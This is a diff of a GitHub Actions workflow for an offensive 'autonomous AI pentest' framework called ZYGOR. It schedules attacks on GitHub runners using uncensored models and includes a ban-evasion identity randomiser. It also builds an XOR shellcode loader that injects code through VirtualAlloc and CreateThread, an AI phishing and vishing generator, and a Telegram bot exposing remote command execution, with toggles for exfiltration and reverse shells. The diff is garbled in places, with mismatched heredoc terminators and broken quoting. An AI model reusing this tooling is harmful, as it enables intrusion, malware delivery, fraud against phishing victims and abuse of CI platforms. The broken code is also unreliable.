@@ -1,31 +1,17 @@
 # ═══════════════════════════════════════════════════════════════════════════════════════════════════
 # ZYGOR v4.0 – THE UNCHAINED AUTONOMOUS AI PENTEST & WEB FORGE FRAMEWORK
 # ═══════════════════════════════════════════════════════════════════════════════════════════════════
-#
-#                                   ███████╗██╗   ██╗ ██████╗  ██████╗ ██████╗ 
-#                                   ╚══███╔╝╚██╗ ██╔╝██╔════╝ ██╔═══██╗██╔══██╗
-#                                     ███╔╝  ╚████╔╝ ██║  ███╗██║   ██║██████╔╝
-#                                    ███╔╝    ╚██╔╝  ██║   ██║██║   ██║██╔══██╗
-#                                   ███████╗   ██║   ╚██████╔╝╚██████╔╝██║  ██║
-#                                   ╚══════╝   ╚═╝    ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
-#
-# ═══════════════════════════════════════════════════════════════════════════════════════════════════
-# ⚡ ZYGOR v4.0 – INFINITE AUTONOMOUS AI HACKING & CODING ENGINE ⚡
-# ═══════════════════════════════════════════════════════════════════════════════════════════════════
 
 name: ZYGOR v4.0
 
 on:
-  # ── 24/7 Schedule: Every 2 hours + staggered offset for redundancy ──
   schedule:
     - cron: '0 */2 * * *'
     - cron: '30 */2 * * *'
-
-  # ── Manual dispatch ──
   workflow_dispatch:
     inputs:
       target:
-        description: '🎯 Target IP range, subnet, domain, or single host'
+        description: '🎯 Target IP, subnet, or domain'
         required: true
         default: '127.0.0.1'
       lhost:
@@ -33,11 +19,11 @@ on:
         required: false
         default: ''
       lport:
-        description: '🎭 Listener port for reverse shells'
+        description: '🎭 Listener port'
         required: false
         default: '4444'
       ai_model:
-        description: '🧠 Ollama uncensored model'
+        description: '🧠 Ollama model'
         required: true
         default: 'dolphin-mixtral'
         type: choice
@@ -48,12 +34,10 @@ on:
           - llama3.1:8b-uncensored
           - mistral
           - mixtral
-          - nous-hermes-2-mixtral-8x7b-dpo
           - codellama
           - deepseek-coder-v2
-          - yi-coder
       penetration_phase:
-        description: '⚡ Attack phase(s) to execute'
+        description: '⚡ Attack phase'
         required: true
         default: 'full'
         type: choice
@@ -63,7 +47,7 @@ on:
           - web_forge
           - full
       enable_exfiltration:
-        description: '⚠️ Enable exfiltration/persistence'
+        description: '⚠️ Enable exfiltration'
         required: true
         default: 'false'
         type: choice
@@ -83,11 +67,11 @@ on:
           - '5'
           - '6'
       github_token_for_abort:
-        description: '🔑 PAT or GitHub token for /abort API'
+        description: '🔑 PAT for API calls'
         required: false
         default: ''
       enable_chat_ops:
-        description: '🤖 Enable interactive AI chat via Issues'
+        description: '🤖 Enable AI chat via Issues'
         required: false
         default: 'true'
         type: choice
@@ -95,7 +79,7 @@ on:
           - 'true'
           - 'false'
       chat_issue_number:
-        description: '📌 GitHub Issue number for chat commands'
+        description: '📌 Issue number for chat'
         required: false
         default: '1'
       backup_provider:
@@ -121,7 +105,7 @@ on:
         required: false
         default: ''
       enable_social_engineering:
-        description: '👤 Enable AI social engineering simulation'
+        description: '👤 Social engineering sim'
         required: false
         default: 'false'
         type: choice
@@ -129,15 +113,15 @@ on:
           - 'true'
           - 'false'
       ctf_mode:
-        description: '🏁 Enable CTF solver mode'
+        description: '🏁 CTF solver mode'
         required: false
         default: 'false'
         type: choice
-
+        options:
           - 'true'
           - 'false'
       cloud_vm_provider:
-        description: '☁️ Cloud provider for ephemeral VMs'
+        description: '☁️ Cloud VM provider'
         required: false
         default: 'none'
         type: choice
@@ -147,19 +131,17 @@ on:
           - gcp
           - azure
       report_email:
-        description: '📧 Email for executive report'
+        description: '📧 Email for report'
         required: false
         default: ''
       discord_webhook:
-        description: '🔔 Discord webhook URL'
+        description: '🔔 Discord webhook'
         required: false
         default: ''
       slack_webhook:
-        description: '🔔 Slack webhook URL'
+        description: '🔔 Slack webhook'
         required: false
         default: ''
-
-  # ── Repository dispatch for self-re-trigger ──
   repository_dispatch:
     types: [zygor-rebirth]
 
@@ -202,45 +184,40 @@ env:
   GITHUB_SHA: ${{ github.sha }}
   GITHUB_REF: ${{ github.ref }}
   GITHUB_ACTOR: ${{ github.actor }}
-  # ── FIX: Use vars instead of secrets for runs-on ──
-  RUNNER: ${{ vars.RUNNER_LABEL || 'ubuntu-latest' }}
 
 jobs:
 
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
-  # JOB 1: BOOTSTRAP
+  # BOOTSTRAP
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
   bootstrap:
-    name: '⚡ ZYGOR Bootstrap & AI Engine'
-    runs-on: ${{ env.RUNNER }}
+    name: '⚡ Bootstrap & AI Engine'
+    runs-on: ubuntu-latest
     timeout-minutes: 360
     outputs:
       ai_ready: ${{ steps.ai_status.outputs.ok }}
       model_pulled: ${{ steps.pull_model.outputs.pulled }}
 
     steps:
-      # ── Anti-Ban / Evasion Layer ──
       - name: '🛡️ Anti-Ban Layer'
         shell: bash
         run: |
-          # Randomized identity per run
           RAND_SUFFIX=$(head -c 6 /dev/urandom | xxd -p)
           echo "ZYGOR_RUN_ALIAS=Maintenance-Check-${RAND_SUFFIX}" >> $GITHUB_ENV
+          echo "RUNNER_ID=${RAND_SUFFIX}" >> $GITHUB_ENV
           sudo hostname "runner-${RAND_SUFFIX}" 2>/dev/null || true
           git config --global user.name "bot-${RAND_SUFFIX}"
           git config --global user.email "bot@${RAND_SUFFIX}.local"
-          sleep $(( RANDOM % 20 + 5 ))
-          echo "✅ Evasion layer active (ID: ${RAND_SUFFIX})"
+          sleep $(( RANDOM % 15 + 5 ))
+          echo "✅ Evasion active (${RAND_SUFFIX})"
 
-      # ── Checkout ──
       - name: '📦 Checkout'
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
           lfs: true
 
-      # ── Restore Ollama cache ──
-      - name: '🧠 Restore Ollama cache'
+      - name: '🧠 Restore Ollama Cache'
         id: cache_ollama
         uses: actions/cache@v4
         with:
@@ -250,8 +227,7 @@ jobs:
             ollama-${{ env.AI_MODEL }}-
             ollama-
 
-      # ── Install OS tools ──
-      - name: '📦 Install toolchain'
+      - name: '📦 Install Toolchain'
         shell: bash
         run: |
           sudo apt-get update -qq
@@ -278,8 +254,7 @@ jobs:
             sendgrid python-telegram-bot python-dotenv \
             2>/dev/null || true
 
-      # ── Go tools ──
-      - name: '🐹 Go tools'
+      - name: '🐹 Go Tools'
         shell: bash
         run: |
           export GOPATH=/home/runner/go
@@ -287,28 +262,21 @@ jobs:
           mkdir -p $GOPATH
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null || true
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null || true
-          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null || true
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest 2>/dev/null || true
-          go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest 2>/dev/null || true
           echo "$GOPATH/bin" | sudo tee -a /etc/environment || true
 
-      # ── Runtime directories ──
-      - name: '📁 Create directories'
+      - name: '📁 Create Directories'
         shell: bash
         run: |
-          sudo mkdir -p /opt/zygor/{bin,templates,wordlists,payloads,reports,reports,logs,c2}
+          sudo mkdir -p /opt/zygor/{bin,templates,wordlists,payloads,reports,logs,c2}
           sudo mkdir -p /var/log/zygor
           sudo chmod -R 777 /opt/zygor /var/log/zygor
 
-      # ── Start Ollama ──
       - name: '🚀 Start Ollama'
         shell: bash
         run: |
           sudo pkill -9 ollama 2>/dev/null || true
           sleep 2
-          export OLLAMA_HOST="${OLLAMA_HOST}"
-          export OLLAMA_KEEP_ALIVE="${OLLAMA_KEEP_ALIVE}"
-          export OLLAMA_READ_TIMEOUT="${OLLAMA_READ_TIMEOUT}"
           ollama serve > /var/log/zygor/ollama.log 2>&1 &
           for i in $(seq 1 40); do
             if curl -s http://localhost:11434/api/tags >/dev/null 2>&1; then
@@ -318,8 +286,7 @@ jobs:
             sleep 2
           done
 
-      # ── Pull model ──
-      - name: '🧠 Pull model: ${{ env.AI_MODEL }}'
+      - name: '🧠 Pull Model: ${{ env.AI_MODEL }}'
         id: pull_model
         shell: bash
         run: |
@@ -332,8 +299,7 @@ jobs:
           (while true; do curl -s -X POST http://localhost:11434/api/generate -d "{\"model\": \"$MODEL\", \"prompt\": \"ping\", \"keep_alive\": -1}" --max-time 30 >/dev/null 2>&1; sleep 300; done) & disown
           echo "pulled=true" >> $GITHUB_OUTPUT
 
-      # ── AI Completion Engine ──
-      - name: '🧬 Build ai_complete'
+      - name: '🧬 Build ai_complete Engine'
         id: ai_status
         shell: bash
         run: |
@@ -343,7 +309,6 @@ jobs:
           PROMPT="$(cat -)"
           MAX_TOKENS="${1:-2048}"
           AI_MODEL="${AI_MODEL:-dolphin-mixtral}"
-
           for i in $(seq 1 10); do
             RESP=$(curl -s -X POST http://localhost:11434/api/generate \
               -d "$(jq -n --arg model "$AI_MODEL" --arg prompt "$PROMPT" \
@@ -356,374 +321,266 @@ jobs:
             fi
             sleep 3
           done
-
           GROQ_KEY="${GROQ_API_KEY:-}"
           if [ -n "$GROQ_KEY" ]; then
             RESP=$(curl -s -X POST "https://api.groq.com/openai/v1/chat/completions" \
               -H "Authorization: Bearer $GROQ_KEY" -H "Content-Type: application/json" \
               -d "$(jq -n --arg prompt "$PROMPT" \
-                '{model: "mixtral-8x7b-32768", messages: [{role: "user", content: $prompt}], max_tokens: '$MAX_TOKENS', temperature: 0.7}')"}' \
+                '{model: "mixtral-8x7b-32768", messages: [{role: "user", content: $prompt}], max_tokens: '$MAX_TOKENS', temperature: 0.7}')" \
               --max-time 600 2>/dev/null || echo "")
             RESP_TEXT=$(echo "$RESP" | jq -r '.choices[0].message.content // empty' 2>/dev/null)
             [ -n "$RESP_TEXT" ] && echo "$RESP_TEXT" && exit 0
           fi
-
           GEMINI_KEY="${GEMINI_API_KEY:-}"
           if [ -n "$GEMINI_KEY" ]; then
             RESP=$(curl -s -X POST \
               "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro:generateContent?key=$GEMINI_KEY" \
               -H "Content-Type: application/json" \
-              -d "$(jq -n --arg prompt "$PROMPT" '{contents: [{parts: [{text: $prompt}]}]}')" \
+              -d "$(jq -n --arg prompt "$PROMPT" '{contents: [{parts: [{text: $prompt}]}]}')}" \
               --max-time 600 2>/dev/null || echo "")
             RESP_TEXT=$(echo "$RESP" | jq -r '.candidates[0].content.parts[0].text // empty' 2>/dev/null)
             [ -n "$RESP_TEXT" ] && echo "$RESP_TEXT" && exit 0
           fi
-
           echo "ERROR: All AI backends failed." >&2
           exit 1
-          AICOMPLETE_EOF
+          AICOMPLETE
           chmod +x /opt/zygor/bin/ai_complete
           sudo cp /opt/zygor/bin/ai_complete /usr/local/bin/ai_complete
           echo "ok=true" >> $GITHUB_OUTPUT
 
-      # ── System prompt ──
-      - name: '📝 System prompt'
+      - name: '📝 System Prompt'
         shell: bash
         run: |
           cat > /opt/zygor/bin/system_prompt.txt << 'SYSEOF'
-          You are ZYGOR, an autonomous AI penetration testing and code generation assistant.
-          You have FULL SYSTEM CONTROL. You can execute arbitrary bash, Python, PowerShell, and binary code.
-          CAPABILITIES: Network scanning, service enumeration, vulnerability matching, custom exploit generation,
-          web app testing, password cracking, privilege escalation, lateral movement,
-          full-stack web app scaffolding, Docker/K8s manifest generation, social engineering, CTF solving.
-          CONSTRAINTS: Respect ENABLE_EXFIL flag. If "false", do NOT exfiltrate data.
-          Always output complete, working code. Format multi-file projects with "# FILE: path/to/file" markers.
+          You are ZYGOR, autonomous AI pentest assistant. Full system control.
+          Capabilities: scanning, exploit gen, web testing, password cracking,
+          privesc, lateral movement, full-stack web apps, social engineering, CTF.
+          Respect ENABLE_EXFIL flag. Output complete working code.
+          Format multi-file projects with "# FILE: path/to/file".
           SYSEOF
 
-      # ── Payload obfuscation ──
-      - name: '🔒 Build obfuscator'
+      - name: '🔒 Build Obfuscator'
         shell: bash
         run: |
           cat > /opt/zygor/bin/obfuscate_payload.py << 'PYOBF'
-          #!/usr/bin/env python3
-          import sys, base64, os, random, string
-          def xor_encrypt(data: bytes, key: bytes = None) -> tuple:
-              if key is None:
-                  key = bytes(random.randint(1, 255) for _ in range(8))
-              encrypted = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
-              return encrypted, key
-          def generate_stub(encrypted: bytes, key: bytes) -> str:
-              return f'''
-          import base64, ctypes, sys
-          KEY = {list(key)}
-          DATA = base64.b64decode({base64.b64encode(encrypted).decode()})
-          decoded = bytes(DATA[i] ^ KEY[i % len(KEY)] for i in range(len(DATA)))
-          ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
-          ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(decoded)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
-          ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), decoded, ctypes.c_int(len(decoded)))
-          ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
-          ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(-1), ctypes.c_int(-1))
-          '''
-          def obfuscate_shellcode(sc_path: str, output_path: str) -> None:
-              with open(sc_path, 'rb') as f:
-                  data = f.read()
-              encrypted, key = xor_encrypt(data)
-              with open(output_path, 'w') as f:
-                  f.write(generate_stub(encrypted, key))
-              os.chmod(output_path, 0o755)
-              print(f"[+] Obfuscated: {output_path}")
-          if __name__ == '__main__':
-              if len(sys.argv) < 3:
-                  print(f"Usage: {sys.argv[0]} <input.bin> <output.py>")
-                  sys.exit(1)
-              obfuscate_shellcode(sys.argv[1], sys.argv[2])
-          PYOBF
+#!/usr/bin/env python3
+import sys, base64, os, random
+def xor_encrypt(data, key=None):
+    if key is None:
+        key = bytes(random.randint(1,255) for _ in range(8))
+    return bytes(data[i] ^ key[i%len(key)] for i in range(len(data))), key
+def gen_stub(enc, key):
+    return f'''
+import base64, ctypes
+KEY = {list(key)}
+DATA = base64.b64decode({base64.b64encode(enc).decode()})
+dec = bytes(DATA[i] ^ KEY[i%len(KEY)] for i in range(len(DATA)))
+ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(dec), 0x3000, 0x40)
+ctypes.windll.kernel32.RtlMoveMemory(ptr, dec, len(dec))
+ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
+ctypes.windll.kernel32.WaitForSingleObject(-1, -1)
+'''
+def obfuscate(sc_path, out_path):
+    with open(sc_path,'rb') as f: data = f.read()
+    enc, key = xor_encrypt(data)
+    with open(out_path,'w') as f: f.write(gen_stub(enc, key))
+    os.chmod(out_path, 0o755)
+    print(f"[+] Obfuscated: {out_path}")
+if __name__ == '__main__':
+    obfuscate(sys.argv[1], sys.argv[2])
+PYOBF
           chmod +x /opt/zygor/bin/obfuscate_payload.py
 
-      # ── Dashboard generator ──
-      - name: '📊 Build dashboard generator'
+      - name: '📊 Build Dashboard Generator'
         shell: bash
         run: |
           cat > /opt/zygor/bin/generate_dashboard.py << 'DBEOF'
-          #!/usr/bin/env python3
-          import json, os, sys
-          TEMPLATE = '''<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ZYGOR v4.0 Dashboard</title><script src="https://cdn.jsdelivr.net/npm/chart.js"></script><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#0a0a0f;color:#00ff88}.header{background:linear-gradient(135deg,#001a00,#003300);padding:20px;text-align:center;border-bottom:2px solid #00ff88}.header h1{font-size:2.5em;text-shadow:0 0 20px #00ff88}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px;padding:20px}.card{background:#111118;border:1px solid #00ff8833;border-radius:12px;padding:20px}.card h2{color:#00ff88;margin-bottom:15px;border-bottom:1px solid #00ff8833;padding-bottom:10px}.stat{display:inline-block;margin:10px;padding:15px;background:#001a00;border-radius:8px;min-width:120px}.stat .value{font-size:2em;font-weight:bold}.finding{border-left:3px solid #ff0044;padding:10px;margin:10px 0}.status-online{color:#00ff88}@keyframes pulse{0%{opacity:1}50%{opacity:0.5}100%{opacity:1}}.pulse{animation:pulse 2s infinite}</style></head><body><div class="header"><h1>⚡ ZYGOR v4.0</h1><div class="subtitle">Target: <strong>TARGET_PLACEHOLDER</strong> | Status: <span class="status-online pulse">● ONLINE</span></div></div><div class="grid"><div class="card"><h2>📊 Overview</h2><div class="stat"><div class="value">0</div><div class="label">Hosts Up</div></div><div class="stat"><div class="value">0</div><div class="label">Ports</div></div><div class="stat"><div class="value">0</div><div class="label">Vulns</div></div><div class="stat"><div class="value">0</div><div class="label">Exploits</div></div></div><div class="card"><h2>📋 Findings</h2><div id="findings">FINDINGS_PLACEHOLDER</div></div><div class="card"><h2>📜 Log</h2><div id="log">LOGS_PLACEHOLDER</div></div><div class="card"><h2>🧠 AI Status</h2><div id="aiStatus">AI_STATUS_PLACEHOLDER</div></div><div class="card"><h2>📈 Progress</h2><canvas id="progressChart"></canvas></div></div><script>new Chart(document.getElementById('progressChart'),{type:'doughnut',data:{labels:['Recon','Exploit','Web Forge','Report'],datasets:[{data:[25,25,25,25],backgroundColor:['#00ff88','#ff6600','#00aaff','#ffcc00'],borderColor:'#0a0a0f'}]},options:{responsive:true,plugins:{legend:{labels:{color:'#00ff88'}}}}}});</script></body></html>'''
-          print(TEMPLATE.replace('TARGET_PLACEHOLDER', sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1')
-                       .replace('FINDINGS_PLACEHOLDER', '<em>No findings</em>')
-                       .replace('LOGS_PLACEHOLDER', '<em>Awaiting data</em>')
-                       .replace('AI_STATUS_PLACEHOLDER', '<p>AI: ONLINE</p>'))
-          DBEOF
+#!/usr/bin/env python3
+import sys
+HTML = '''<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ZYGOR v4.0 Dashboard</title><script src="https://cdn.jsdelivr.net/npm/chart.js"></script><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Segoe UI,sans-serif;background:#0a0a0f;color:#00ff88}.header{background:linear-gradient(135deg,#001a00,#003300);padding:20px;text-align:center;border-bottom:2px solid #00ff88}.h1{font-size:2.5em;text-shadow:0 0 20px #00ff88}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px;padding:20px}.card{background:#111118;border:1px solid #00ff8833;border-radius:12px;padding:20px}.card h2{color:#00ff88}.stat{display:inline-block;margin:10px;padding:15px;background:#001a00;border-radius:8px;min-width:120px}.stat .value{font-size:2em}.status-online{color:#00ff88}</style></head><body><div class="header"><h1>⚡ ZYGOR v4.0</h1><div>Target: <strong>TGT</strong> | Status: <span class="status-online">● ONLINE</span></div></div><div class="grid"><div class="card"><h2>📊 Overview</h2><div class="stat"><div class="value">0</div><div class="label">Hosts</div></div><div class="stat"><div class="value">0</div><div class="label">Vulns</div></div></div><div class="card"><h2>🧠 AI</h2><p>Model: MODEL</p><p>Online</p></div></div></body></html>'''
+print(HTML.replace('TGT', sys.argv[1] if len(sys.argv)>1 else '127.0.0.1').replace('MODEL', sys.argv[1] if len(sys.argv)>1 else 'dolphin-mixtral'))
+DBEOF
           chmod +x /opt/zygor/bin/generate_dashboard.py
 
-      # ── Social engineer ──
-      - name: '👤 Build social engineer'
+      - name: '👤 Build Social Engineer'
         shell: bash
         run: |
           cat > /opt/zygor/bin/social_engineer.py << 'SOCEOF'
-          #!/usr/bin/env python3
-          import subprocess, sys, json
-          def generate_phishing_email(name, company, pretext):
-              p = f"Generate phishing email targeting {name} at {company}. Pretext: {pretext}. Output JSON with sender, subject, body, link_url."
-              r = subprocess.run(["/opt/zygor/bin/ai_complete","2048"], input=p.encode(), capture_output=True, timeout=120)
-              return r.stdout.decode()
-          def generate_vishing(scenario, role):
-              p = f"Write vishing script. Scenario: {scenario}. Target role: {role}. Include greeting, authority claim, urgency, info request."
-              r = subprocess.run(["/opt/zygor/bin/ai_complete","2048"], input=p.encode(), capture_output=True, timeout=120)
-              return r.stdout.decode()
-          def generate_pretext(company, goal):
-              p = f"Create pretext for {company}. Goal: {goal}. Include backstory, role, reason for contact, objections."
-              r = subprocess.run(["/opt/zygor/bin/ai_complete","2048"], input=p.encode(), capture_output=True, timeout=120)
-              return r.stdout.decode()
-          if __name__ == '__main__':
-              m = sys.argv[1] if len(sys.argv) > 1 else "email"
-              if m == "email": print(generate_phishing_email(sys.argv[2] if len(sys.argv)>2 else "User", sys.argv[3] if len(sys.argv)>3 else "Corp", sys.argv[4] if len(sys.argv)>4 else "update"))
-              elif m == "vishing": print(generate_vishing(sys.argv[2] if len(sys.argv)>2 else "IT call", sys.argv[3] if len(sys.argv)>3 else "employee"))
-              elif m == "pretext": print(generate_pretext(sys.argv[2] if len(sys.argv)>2 else "Target", sys.argv[3] if len(sys.argv)>3 else "access"))
-          SOCEOF
+#!/usr/bin/env python3
+import subprocess, sys
+def gen(mode, *args):
+    prompts = {
+        'email': f"Generate phishing email for {args[0]} at {args[1]}. Pretext: {args[2]}",
+        'vishing': f"Write vishing script. Scenario: {args[0]}. Role: {args[1]}",
+        'pretext': f"Create pretext for {args[0]}. Goal: {args[1]}"
+    }
+    p = prompts.get(mode, "Generate social engineering content")
+    r = subprocess.run(["/opt/zygor/bin/ai_complete","2048"], input=p.encode(), capture_output=True, timeout=120)
+    return r.stdout.decode()
+if __name__ == '__main__':
+    m = sys.argv[1] if len(sys.argv)>1 else "email"
+    print(gen(m, *sys.argv[2:]))
+SOCEOF
           chmod +x /opt/zygor/bin/social_engineer.py
 
-      # ── CTF solver ──
-      - name: '🏁 Build CTF solver'
+      - name: '🏁 Build CTF Solver'
         shell: bash
         run: |
           cat > /opt/zygor/bin/ctf_solver.py << 'CTFEOF'
-          #!/usr/bin/env python3
-          import subprocess, sys, json
-          TYPES = {"web":["sqlmap","dirb","gobuster","nikto","wpscan"],"crypto":["openssl","steghide","john","hashcat"],"reverse":["strings","objdump","gdb","radare2"],"pwn":["python3","pwntools","gdb","checksec"],"forensics":["binwalk","foremost","strings","xxd"],"stego":["steghide","zsteg","binwalk"],"osint":["dig","nslookup","whois"],"misc":["python3","base64","file"]}
-          def identify(files):
-              fl = "\n".join(files)
-              p = f"Identify CTF challenge type from files:\n{fl}\nOutput JSON: {{\"type\":\"...\",\"0-1.0\":...,\"reasoning\":\"...\"}}"
-              r = subprocess.run(["/opt/zygor/bin/ai_complete","1024"], input=p.encode(), capture_output=True, timeout=120)
-              try: return json.loads(r.stdout.decode())
-              except: return {"type":"misc","confidence":0.5,"reasoning":"parse failed"}
-          def generate_solution(ctype, files):
-              p = f"CTF type: {ctype}. Files: {', '.join(files)}. Write step-by-step solution with commands and expected flag format."
-              r = subprocess.run(["/opt/zygor/bin/ai_complete","4096"], input=p.encode(), capture_output=True, timeout=300)
-              return r.stdout.decode()
-          if __name__ == '__main__':
-              files = sys.argv[1:] or ["."]
-              a = identify(files)
-              print(f"Type: {a.get('type','?')}")
-              sol = generate_solution(a.get('type','misc'), files)
-              print(sol)
-          CTFEOF
+#!/usr/bin/env python3
+import subprocess, sys, json
+TYPES = {"web":["sqlmap","dirb","gobuster"],"crypto":["openssl","john","hashcat"],"reverse":["strings","gdb"],"pwn":["python3","pwntools"],"forensics":["binwalk","strings"],"stego":["steghide","zsteg"],"osint":["dig","whois"],"misc":["file","strings"]}
+def identify(files):
+    p = f"Identify CTF type from: {', '.join(files)}. Output JSON: {{\"type\":\"...\",\"confidence\":0.0,\"reasoning\":\"...\"}}"
+    r = subprocess.run(["/opt/zygor/bin/ai_complete","1024"], input=p.encode(), capture_output=True, timeout=120)
+    try: return json.loads(r.stdout.decode())
+    except: return {"type":"misc","confidence":0.5}
+def solve(ctype, files):
+    p = f"CTF {ctype}. Files: {', '.join(files)}. Step-by-step solution with commands and flag format."
+    r = subprocess.run(["/opt/zygor/bin/ai_complete","4096"], input=p.encode(), capture_output=True, timeout=300)
+    return r.stdout.decode()
+if __name__ == '__main__':
+    files = sys.argv[1:] or ["."]
+    a = identify(files)
+    print(f"Type: {a.get('type','?')}")
+    print(solve(a.get('type','misc'), files))
+CTFEOF
           chmod +x /opt/zygor/bin/ctf_solver.py
 
-      # ── Notify dispatcher ──
-      - name: '🔔 Build notify dispatcher'
+      - name: '🔔 Build Notify'
         shell: bash
         run: |
           cat > /opt/zygor/bin/notify.py << 'NOTEOF'
-          #!/usr/bin/env python3
-          import json, os, sys, urllib.request
-          def send_discord(url, msg):
-              req = urllib.request.Request(url, data=json.dumps({"content":msg,"username":"ZYGOR"}).encode(), headers={"Content-Type":"application/json"})
-              try: return urllib.request.urlopen(req, timeout=15).status == 204
-              except: return False
-          def send_slack(url, msg):
-              req = urllib.request.Request(url, data=json.dumps({"text":msg,"username":"ZYGOR"}).encode(), headers={"Content-Type":"application/json"})
-              try: return urllib.request.urlopen(req, timeout=15).status == 200
-              except: return False
-          if __name__ == '__main__':
-              if len(sys.argv) < 3: print("Usage: notify.py <discord|slack> <msg> [webhook]"); sys.exit(1)
-              m=sys.argv[1]; msg=sys.argv[2]; wh=sys.argv[3] if len(sys.argv)>3 else os.environ.get("DISCORD_WEBHOOK","") if m=="discord" else os.environ.get("SLACK_WEBHOOK","")
-              if wh:
-                  if m=="discord": send_discord(wh,msg)
-                  elif m=="slack": send_slack(wh,msg)
-          NOTEOF
+#!/usr/bin/env python3
+import json, os, sys, urllib.request
+def send(url, msg, platform='discord'):
+    if platform == 'discord':
+        data = json.dumps({"content":msg,"username":"ZYGOR"}).encode()
+    else:
+        data = json.dumps({"text":msg,"username":"ZYGOR"}).encode()
+    req = urllib.request.Request(url, data=data, headers={"Content-Type":"application/json"})
+    try: urllib.request.urlopen(req, timeout=15); return True
+    except: return False
+if __name__ == '__main__':
+    if len(sys.argv) < 3: sys.exit(1)
+    send(sys.argv[3] if len(sys.argv)>3 else os.environ.get('DISCORD_WEBHOOK',''), sys.argv[2], sys.argv[1])
+NOTEOF
           chmod +x /opt/zygor/bin/notify.py
 
-      # ── Telegram Bot ──
       - name: '📱 Telegram Bot'
         if: env.TELEGRAM_ENABLE == 'true'
         shell: bash
         env:
           TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
-          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
         run: |
           if [ -z "$TELEGRAM_BOT_TOKEN" ]; then echo "⚠️ No token"; exit 0; fi
-
           cat > /opt/zygor/bin/telegram_controller.py << 'PYEOF'
-          #!/usr/bin/env python3
-          import asyncio, os, subprocess, sys, logging, json, time, re, glob
-          from telegram import Update
-          from telegram.ext import Application, CommandHandler, ContextTypes
+#!/usr/bin/env python3
+import asyncio, os, subprocess, logging
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
+TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN','')
+CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID','')
+TARGET = os.environ.get('TARGET','127.0.0.1')
+ENABLE_EXFIL = os.environ.get('ENABLE_EXFIL','false')
+logging.basicConfig(level=logging.INFO, filename='/var/log/zygor/telegram_bot.log')
 
-          TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
-          CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
-          TARGET = os.environ.get('TARGET', '127.0.0.1')
-          LHOST = os.environ.get('LHOST', '')
-          LPORT = os.environ.get('LPORT', '4444')
-          ENABLE_EXFIL = os.environ.get('ENABLE_EXFIL', 'false')
+async def run(cmd, timeout=60):
+    try:
+        p = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        o, e = await asyncio.wait_for(p.communicate(), timeout=timeout)
+        return (o+e).decode(errors='replace')[:4000]
+    except: return "Error"
 
-          logging.basicConfig(level=logging.INFO, filename='/var/log/zygor/telegram_bot.log')
+async def start(u, c):
+    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
+    await u.message.reply_text(f"⚡ ZYGOR Online\n🎯 {TARGET}\n/help")
 
-          async def run_cmd(cmd: str, timeout=60) -> str:
-              try:
-                  proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-                  out, err = await asyncio.wait_for(proc.communicate(), timeout=timeout)
-                  return (out + err).decode(errors='replace')[:4000]
-              except: return "Timeout/Error"
+async def help_cmd(u, c):
+    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
+    await u.message.reply_text("/scan <target>\n/exploit <target>\n/ai <q>\n/exec <cmd>\n/status\n/abort")
 
-          async def run_ai(prompt: str, maxtokens=2048) -> str:
-              try:
-                  proc = await asyncio.create_subprocess_exec('/opt/zygor/bin/ai_complete', str(maxtokens), stdin=asyncio.subprocess.PIPE,
-                  out, _ = await asyncio.wait_for(proc.communicate(input=prompt.encode()), timeout=300)
-                  return out.decode(errors='replace')[:4000]
-              except: return "AI Error"
+async def scan(u, c):
+    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
+    t = ' '.join(c.args) or TARGET
+    await u.message.reply_text(f"🔍 Scanning {t}...")
+    r = await run(f"nmap -T4 -A -p- --script vuln {t} 2>/dev/null | tail -60", 300)
+    await u.message.reply_text(f"```\n{r[:3000]}\n```")
 
-          def auth(update):
-              return not CHAT_ID or str(update.effective_chat.id) == CHAT_ID
+async def do_exploit(u, c):
